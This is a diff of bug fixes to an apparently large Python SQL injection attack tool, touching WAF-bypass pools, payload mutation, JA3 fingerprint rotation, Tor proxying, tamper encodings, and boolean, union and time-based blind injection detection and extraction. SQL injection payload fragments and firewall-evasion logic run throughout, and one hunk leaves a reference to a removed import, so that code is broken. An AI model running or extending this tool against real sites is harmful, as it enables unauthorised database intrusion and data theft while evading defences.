@@ -20000,8 +20000,8 @@ class BypassPool:
             
             if not next_bypass.burned:
                 self.total_switches += 1
-                print(f"[i] [BypassPool] Switched to bypass #{self.current_index + 1} "
-                      f"(quality: {next_bypass.quality.name}, score: {next_bypass.quality_score:.1f})")
+                LOG.info(f"[BypassPool] Switched to bypass #{self.current_index + 1} "
+                         f"(quality: {next_bypass.quality.name}, score: {next_bypass.quality_score:.1f})")
                 return next_bypass
             
             attempts += 1
@@ -20333,10 +20333,11 @@ class PayloadRemutator:
         Returns:
             Mutated payload
         """
-        # BUG-V39-7 FIX (Req 9/15): Removed `import random` inline.
-        # `random` is already imported at module level (line ~1616).
-        random.seed(seed)
-        
+        # Use a thread-local/per-call RNG to avoid contaminating the global random state.
+        # random.seed(seed) would affect all other concurrent coroutines sharing the
+        # module-level random object.
+        _local_rng = random.Random(seed)
+
         mutations = [
             # Comment injection
             lambda p: p.replace(' ', '/**/'),
@@ -20355,9 +20356,9 @@ class PayloadRemutator:
             # Plus variations
             lambda p: p.replace(' ', '+'),
         ]
-        
-        # Apply random mutation
-        mutation_func = random.choice(mutations)
+
+        # Apply random mutation using local RNG (no global state contamination)
+        mutation_func = _local_rng.choice(mutations)
         return mutation_func(payload)
     
     def reset_for_new_base(self):
@@ -20414,9 +20415,9 @@ class RecoveryEngine:
         
         self.strategy_attempts[strategy] += 1
         
-        print(f"[!] [Recovery] WAF blocking detected ({failure_rate*100:.1f}% failure rate)")
-        print(f"[i] [Recovery] Executing strategy: {strategy.value} "
-              f"(attempt #{self.strategy_attempts[strategy]})")
+        LOG.warning(f"[Recovery] WAF blocking detected ({failure_rate*100:.1f}% failure rate)")
+        LOG.info(f"[Recovery] Executing strategy: {strategy.value} "
+                 f"(attempt #{self.strategy_attempts[strategy]})")
         
         # Execute the selected strategy
         if strategy == RecoveryStrategy.SLOW_DOWN:
@@ -20639,7 +20640,7 @@ class RecoveryEngine:
         # BUG-RECOVERY-2 FIX: reset attempt counter for the successful strategy so
         # it can be re-used when _select_strategy checks `strategy_attempts < 3`.
         self.strategy_attempts[strategy] = 0
-        print(f"[✓] [Recovery] Strategy '{strategy.value}' successful!")
+        LOG.info(f"[Recovery] Strategy '{strategy.value}' successful!")
 
 # ============================================================================
 # ADAPTIVE EXTRACTION COORDINATOR
@@ -21134,10 +21135,10 @@ def generate_bypass_variant(base_payload, seed):
     # BUG-V39-6 FIX (Req 9/15): Removed `import random` inline.
     # generate_bypass_variant is called from TamperLib.comment_seed_diversify which
     # is part of _tl_choices2 in mutate_all() — called on every payload mutation.
-    # `random` is already imported at module level (line ~1616). Using the module-
-    # level `random` object eliminates the repeated sys.modules lookup per call.
-    random.seed(seed)
-    comment_id = random.randint(1000, 9999)
+    # Use a per-call local RNG to avoid contaminating the global random state;
+    # random.seed(seed) would affect all concurrent coroutines.
+    _local_rng = random.Random(seed)
+    comment_id = _local_rng.randint(1000, 9999)
     
     # Replace existing comment or add new one
     if '/*' in base_payload:
@@ -21367,7 +21368,7 @@ def _safe_index(container, index, default=None):
         elif isinstance(container, dict):
             return container.get(index, default)
         else:
-            return container[index] if index < len(container) else default
+            return container[index] if (isinstance(index, int) and 0 <= index < len(container)) else default
     except (IndexError, KeyError, TypeError):
         return default
     return default
@@ -21534,12 +21535,16 @@ def parse_retry_after(response) -> Optional[int]:
     
     # Format 2: HTTP-date (rare but valid)
     try:
-        from email.utils import parsedate_to_datetime
-        retry_date = parsedate_to_datetime(retry_after)
+        import email.utils as _eu
         from datetime import timezone as _tz
-        wait_seconds = (retry_date - retry_date.__class__.now(_tz.utc)).total_seconds()
-        return max(0, int(wait_seconds))
-    except:
+        _parsed_tup = _eu.parsedate_tz(retry_after)
+        if _parsed_tup is not None:
+            _retry_ts = _eu.mktime_tz(_parsed_tup)
+            import calendar as _cal
+            _now_ts = _cal.timegm(time.gmtime())
+            return max(0, int(_retry_ts - _now_ts))
+        return None
+    except Exception:
         return None
 
 
@@ -21913,12 +21918,17 @@ def is_garbage_data(extracted_string: str) -> bool:
             return True
     
     # Layer 6: Suspicious entropy for bulk extractions
-    # If we have very long random-looking data (>5000 chars) with high entropy,
-    # it might be binary or corrupted
+    # If we have very long random-looking data (>5000 chars) with high character
+    # uniqueness ratio, it might be binary or corrupted data.
+    # NOTE: Shannon entropy H = -sum(p*log2(p)) is the correct measure, but for
+    # very long strings a simple uniqueness ratio (unique_chars/min(len,256)) is
+    # a fast proxy: >0.9 means nearly every one of the 256 possible byte values
+    # appears, which is characteristic of binary garbage in text extractions.
     if len(extracted_string) > 5000:
         unique_chars = len(set(extracted_string))
-        entropy = unique_chars / len(extracted_string)
-        if entropy > 0.9:  # Nearly every character is unique (very high entropy = garbage)
+        # Normalize by min(len, 256) since there are only 256 possible byte values
+        uniqueness_ratio = unique_chars / min(len(extracted_string), 256)
+        if uniqueness_ratio > 0.9:  # >90% of all possible characters present = binary/garbage
             return True
     
     # Layer 7: Check for control characters density (excluding common whitespace)
@@ -24148,9 +24158,9 @@ async def extract_char_with_consensus(
     # Check if we have consensus
     if best_votes >= min_agreement:
         return best_char
-    
-    # No consensus - return most common but flag as uncertain
-    return best_char
+
+    # No consensus — return None so callers can distinguish uncertain from confirmed
+    return None
 
 
 async def extract_with_verification(
@@ -24201,8 +24211,8 @@ async def extract_with_verification(
     if len(set(results)) == 1:
         return results[0]
     
-    # Results differ - use longest (likely most complete)
-    return max(results, key=len)
+    # Results differ - use most frequent (most consistent = most likely correct)
+    return max(set(results), key=results.count)
 
 
 async def extract_with_retry(
@@ -28069,7 +28079,7 @@ class ConnectionPoolManager:
                     # Recreate client
                     import httpx
                     self._engine._client = httpx.AsyncClient(
-                        timeout=httpx.Timeout(self._engine._timeout),
+                        timeout=httpx.Timeout(self._engine.config.timeout),
                         follow_redirects=True,
                         verify=False,
                         limits=httpx.Limits(max_connections=20, max_keepalive_connections=10))
@@ -29407,7 +29417,7 @@ class JA3RotatingSSLFactory:
 class HTTPEngine:
     def __init__(self, config: Config, session: Optional[ScanSession]=None):
         self.config=config; self.session=session
-        self._sema=asyncio.Semaphore(config.threads)
+        self._sema: Optional[asyncio.Semaphore]=None  # created in __aenter__ where event loop is running
         self._client: Optional[httpx.AsyncClient]=None
         # JA3 ROTATION: factory is created in __aenter__ when stealth/waf_bypass
         # is active; stays None otherwise so zero overhead on plain scans.
@@ -29418,6 +29428,7 @@ class HTTPEngine:
         self._req_count=0
 
     async def __aenter__(self):
+        self._sema = asyncio.Semaphore(self.config.threads)  # create inside event loop (Python 3.10+)
         self._proxy_url = (self.config.proxy or
                    ("socks5://127.0.0.1:9050" if self.config.tor else None))
         limits=httpx.Limits(max_connections=self.config.threads*2,
@@ -29458,7 +29469,7 @@ class HTTPEngine:
             cookies=httpx.Cookies(),   # persistent jar — Cloudflare cf_clearance and
                                        # __cf_bm are set on first response and sent on
                                        # every subsequent request automatically
-            timeout=httpx.Timeout(_timeout, connect=10, pool=None), follow_redirects=True)
+            timeout=httpx.Timeout(_timeout, connect=10, pool=30.0), follow_redirects=True)
         # CRITICAL FIX: Add extraction lock to ensure ONLY ONE extraction runs at a time
         # Multiple confirmations (headers + params) must extract sequentially, not in parallel
         self._extraction_lock = asyncio.Lock()
@@ -30556,7 +30567,7 @@ class TamperLib:
         # obsolete folding (RFC 9110 §5.5), causing LocalProtocolError crashes when
         # the tampered URL leaks into a Referer header.  Use /**/ instead which is
         # universally valid SQL whitespace and legal in HTTP header values.
-        blanks=[" ","\n","/**/", " /**/ "]
+        blanks=[" ","/**/", " /**/ ", "%20"]
         return "".join(random.choice(blanks) if c==" " else c for c in p)
 
     #  Encoding 
@@ -30728,7 +30739,7 @@ class TamperLib:
                 result.append(w)
         return " ".join(result)
     @staticmethod
-    def bluecoat(p:str)->str: return p.replace(" ","\x09")  # tab instead of space
+    def bluecoat(p:str)->str: return p.replace(" ","%09")  # tab instead of space (percent-encoded to avoid httpx rejection)
     @staticmethod
     def sp_password(p:str)->str:
         return p+"--sp_password"  # MSSQL-specific bypass
@@ -31301,7 +31312,7 @@ class TamperLib:
                    lambda m: f"pg_sleep({random.choice(_exprs.get(m.group(1),[m.group(1)]))})",
                    p, flags=_re.IGNORECASE)
         p = re.sub(r'\bWAITFOR\s+DELAY\s+\'\d+:\d+:([\d.]+)\'',
-                   lambda m: f"WAITFOR DELAY '0:0:{random.choice(_exprs.get(m.group(1),[m.group(1)]))}'" ,
+                   lambda m: f"WAITFOR DELAY '0:0:{random.choice(_exprs.get(m.group(1).lstrip('0') or '0',[m.group(1)]))}'" ,
                    p, flags=_re.IGNORECASE)
         return p
 
@@ -31735,7 +31746,7 @@ def _augment_chain_for_dbms(chain: list, dbms: str) -> list:
     # Fix: detect ANY encoding tamper as the last element and insert before it.
     _ENCODING_TAMPERS = frozenset({"charencode", "hex_payload", "unicodeencode",
                                     "chardoubleencode", "utf8encode", "multilevel_encode",
-                                    "chardoubleencode", "percentencode_selective"})
+                                    "percentencode_selective"})
     if chain and chain[-1] in _ENCODING_TAMPERS:
         chain = chain[:-1] + _aug + [chain[-1]]
     else:
@@ -33533,9 +33544,8 @@ class SQLMutationEngine:
         # identical (/**/ and /*123*/ and /*xyz*/ are all whitespace to every DBMS).
         # String delimiter safety: this method never enters string literals — the replacement
         # targets " AND " and " OR " as bare token separators, not inside string contexts.
-        import random as _rbuf
-        _a = _rbuf.randint(100, 9999)
-        _b = _rbuf.randint(100, 9999)
+        _a = random.randint(100, 9999)
+        _b = random.randint(100, 9999)
         _c = _rbuf.randint(100, 9999)
         buf_pre = f"/*{_a}*//*{_b}*//*{_c}*/"
         _d = _rbuf.randint(100, 9999)
@@ -36845,7 +36855,7 @@ class RequestPaddingEngine:
         
         for pad_size in self.PADDING_SIZES:
             # Strategy A: Body parameter padding (POST/PUT)
-            if method.upper() in ("POST", "PUT", "PATCH") or data:
+            if method.upper() in ("POST", "PUT", "PATCH"):
                 _pad_data = "z" * pad_size
                 _padded_value = original + payload
                 try:
@@ -39965,6 +39975,7 @@ async def detect_boolean(engine,config,method,url,data,data_fmt,
                     _rate_limiter.record_request(true_fp, 0)
                     _rate_limiter.record_request(false_fp, 0)
                 if not _validate_response(true_fp, func_name="waf_block_check"): continue
+                if not _validate_response(false_fp, func_name="waf_block_check"): continue
                 # FIX-BOOL-PAIRWISE-WAF: skip when BOTH probes carry the same WAF status —
                 # body-size difference is WAF-page noise, not a SQL boolean signal.
                 # Do NOT use is_waf_block(true_fp) OR …(false_fp) here: asymmetric blocking
@@ -40029,7 +40040,7 @@ async def detect_boolean(engine,config,method,url,data,data_fmt,
                         if not _b_fpg_ok:
                             LOG.debug(f'[detect_boolean] FP guard rejected {param!r} — continuing to next payload')
                             continue
-                        _b_det_conf = min(1.0, max(0.6+abs(delta), _b_fpg_conf))
+                        _b_det_conf = min(1.0, max(0.6+abs(c_delta), _b_fpg_conf))
                         # BUG-V33-7c FIX (Req 15 / BUG-V32-15): Invoke WassersteinResponseOracle
                         # as secondary boolean oracle when confidence is in the ambiguous [0.65,0.85]
                         # range where the EMD oracle provides the most discriminative signal.
@@ -40116,6 +40127,8 @@ async def detect_boolean(engine,config,method,url,data,data_fmt,
                                 return None
 
                             _ue_fp_f = await _send_injected(engine, method, url, data, data_fmt, param, original + _ue_false_sfx, tamper_chain)
+                            if _SCAN_STOPPED[0]:  # BUG-A-FIX: stop after false probe
+                                return None
                             if not _validate_response(_ue_fp_t, func_name="waf_block_check"): continue
                             if _ue_fp_t and _ue_fp_f and not WAFBlockDiscriminator.both_waf_blocked(_ue_fp_t, _ue_fp_f) and not WAFBlockDiscriminator.is_waf_block(_ue_fp_t) and not WAFBlockDiscriminator.is_waf_block(_ue_fp_f):
                                 _ue_ts = _sim_to_baseline(_ue_fp_t, baseline)
@@ -40178,7 +40191,8 @@ async def detect_boolean(engine,config,method,url,data,data_fmt,
                     if not _rpg_true or not _rpg_false or _rpg_true == _rpg_false:
                         continue
                     _rpg_ts = _rpg_mut.mutate_all(_rpg_true, technique="B")
-                    _rpg_fs = _rpg_mut.mutate_all(_rpg_false, technique="B")
+                    _rpg_mut2 = SQLMutationEngine(dbms=_rpg_dbms, surface=data_fmt or "url")
+                    _rpg_fs = _rpg_mut2.mutate_all(_rpg_false, technique="B")
                     await asyncio.sleep(0.002)
                     if _SCAN_STOPPED[0]:
                         break
@@ -41693,12 +41707,8 @@ async def detect_union(engine,config,method,url,data,data_fmt,
                             await asyncio.sleep(0.1)
                             if _SCAN_STOPPED[0]: break
                             try:
-                                _u1_cfp = await self._safe_confirm(method, url, data, data_fmt,
-                                    param, original + _u_payload, self.tamper_chain, bypass_mutation=True) if hasattr(self, '_safe_confirm') else None
-                                if _u1_cfp is None:
-                                    _u1_cfp_fp = await _send_injected(engine, method, url, data, data_fmt,
-                                        param, original + _u_payload, tamper_chain)
-                                    _u1_cfp = _u1_cfp_fp
+                                _u1_cfp = await _send_injected(engine, method, url, data, data_fmt,
+                                    param, original + _u_payload, tamper_chain)
                                 if _u1_cfp and _validate_response(_u1_cfp, allow_empty=True):
                                     _u1_cf_body = _u1_cfp.body if hasattr(_u1_cfp, 'body') else b""
                                     _u1_cf_sim = SimHasher.body_similarity(_u1_bl_body, _u1_cf_body) if _u1_bl_body and _u1_cf_body else 1.0
@@ -41949,7 +41959,6 @@ async def detect_union(engine,config,method,url,data,data_fmt,
             _nc_cols_raw = [c for c in _nc_nulls_match.group(1).split(',')]
             _nc_n = len(_nc_cols_raw)
             # Try sentinel in each column position
-            _nc_found = False
             for _nc_ci in range(_nc_n):
                 if _SCAN_STOPPED[0]: break
                 await _apply_request_delay(config)
@@ -41994,8 +42003,7 @@ async def detect_union(engine,config,method,url,data,data_fmt,
                             exact_sent_payload=_nc_exact)
                 except Exception:
                     continue
-            if _nc_found:
-                break
+            # (no _nc_found break needed — detection paths return directly)
 
     # BUG-REQ2-2 FIX (Req 1 & 2): Wire _run_cross_category_probes for Generic/unknown DBMS.
     # Mirrors the detect_boolean supplement (line ~12384) and the detect_error fix above.
@@ -42042,7 +42050,7 @@ async def detect_union(engine,config,method,url,data,data_fmt,
                     r'UNION\s+(?:ALL\s+)?SELECT\s+(.*?)(?:\s*--|#|$)',
                     str(p), _re.I | _re.S)
                 if _u_xcat_col_m:
-                    _u_xcat_n = len([c for c in _u_xcat_col_m.group(1).split(',')])
+                    _u_xcat_n = len(_split_sql_cols(_u_xcat_col_m.group(1)))
                     if _u_xcat_n != _u_xcat_cols_conf:
                         return None  # column count mismatch → guaranteed syntax error
             except Exception:
@@ -42090,7 +42098,7 @@ async def detect_union(engine,config,method,url,data,data_fmt,
                 _u_cfp2 = await _send_injected(engine, method, url, data, data_fmt,
                     param, original + str(p), tamper_chain)
                 if _u_cfp2 and _validate_response(_u_cfp2, allow_empty=True) and _u_cfp2.body:
-                    _u_cf2_body = _u(_extract_body_safe(_u_cfp2) or b"") or b""
+                    _u_cf2_body = _extract_body_safe(_u_cfp2) or b""
                     _u_cf2_sim = SimHasher.body_similarity(_u_xcat_bl_body, _u_cf2_body) if _u_xcat_bl_body and _u_cf2_body else 1.0
                     _u_cf2_delta = len(_u_cf2_body) - len(_u_xcat_bl_body)
                     if _u_cf2_sim < 0.80 or _u_cf2_delta >= 30:
@@ -42229,6 +42237,8 @@ async def _sqlite_randomblob_waf_canary(
         "' AND 1=LIKE(CHAR(65,66,67,68,69),"
         f"UPPER(HEX(RANDOMBLOB({CANARY_BLOB}))))--"
     )
+    if not isinstance(baseline, dict):
+        baseline = {}
     mean_t           = baseline.get("mean_timing", 100)
     CANARY_THRESHOLD = mean_t + 300   # 300 ms above clean baseline is sufficient
     try:
@@ -42351,6 +42361,8 @@ async def _detect_time_sleep_free(
     _cev_sf = getattr(config, "_confirmed_event", None)
     if _cev_sf and _cev_sf.is_set():
         return None
+    if not isinstance(baseline, dict):
+        baseline = {}
     t      = config.time_sec
     mean_t = baseline.get("mean_timing", 100)
     std_t  = max(baseline.get("std_timing", 50), 50)
@@ -42368,6 +42380,7 @@ async def _detect_time_sleep_free(
     def _fill(tpl: str) -> str:
         return (tpl
                 .replace("{t}",        str(int(t)))
+                .replace("{big}",      str(_bench))
                 .replace("{bench}",    str(_bench))
                 .replace("{sq_limit}", str(_sq_limit))
                 .replace("{rec_n}",    str(_rec_n))
@@ -42378,6 +42391,7 @@ async def _detect_time_sleep_free(
         """Fill template with halved computational load for proportional confirmation."""
         return (tpl
                 .replace("{t}",        str(int(t)))
+                .replace("{big}",      str(max(1, _bench    // 2)))
                 .replace("{bench}",    str(max(1, _bench    // 2)))
                 .replace("{sq_limit}", str(max(1, _sq_limit // 2)))
                 .replace("{rec_n}",    str(max(1, _rec_n    // 2)))
@@ -42427,9 +42441,9 @@ async def _detect_time_sleep_free(
                         return None
                     fp = await _send_injected(engine, method, url, data, data_fmt,
                                               param, original + probe_payload, tamper_chain)
+                    if not _validate_response(fp, func_name="waf_block_check"): return None  # BUG-FIX-SYNTAX: continue→return None (not inside loop)
                     LOG.debug(f"  [sleep-free/{dbms}/{bypass_label}]"
                               f" elapsed={fp.elapsed_ms:.0f}ms")
-                    if not _validate_response(fp, func_name="waf_block_check"): return None  # BUG-FIX-SYNTAX: continue→return None (not inside loop)
                     if WAFBlockDiscriminator.is_waf_block(fp):
                         return None  # still blocked after bypass attempt
                     if fp.elapsed_ms >= expected:
@@ -42474,12 +42488,14 @@ async def _detect_time_sleep_free(
                         fp2 = await _send_injected(engine, method, url, data, data_fmt,
                                                    param, original + short_payload,
                                                    tamper_chain)
-                        
+                        if fp2 is None:
+                            return None  # network error on half-load probe
+
                         # Probe 4: second baseline (confirm server is still fast without injection)
                         fp_bl2 = await _send_injected(engine, method, url, data, data_fmt,
                                                        param, original, tamper_chain)
                         _bl2_ms = fp_bl2.elapsed_ms if fp_bl2 else 0
-                        
+
                         # All checks must pass:
                         # - half-load < full * 0.85 (proportional)
                         # - half-load > mean_t + 100 (still doing work)
@@ -42547,9 +42563,11 @@ async def detect_time(engine, config, method, url, data, data_fmt,
     both FULL and DIFFERENTIAL oracle modes (403 is not a blocker for timing).
     """
     t        = config.time_sec
+    if not isinstance(baseline, dict):
+        baseline = {}
     # BUG #5 FIX: Use .get() with defaults for baseline dictionary access
-    mean_t   = baseline.get("mean_timing", 300) if isinstance(baseline, dict) else 300
-    std_t    = max(baseline.get("std_timing", 50) if isinstance(baseline, dict) else 50, 50)
+    mean_t   = baseline.get("mean_timing", 300)
+    std_t    = max(baseline.get("std_timing", 50), 50)
     expected = mean_t + max(t * 1000 * 0.8, std_t * 3.0)
     # In DIFFERENTIAL/TIMING_ONLY mode, rebuild expected from RobustTimingOracle
     _oracle_mode = getattr(config, "_oracle_mode", OracleMode.FULL)
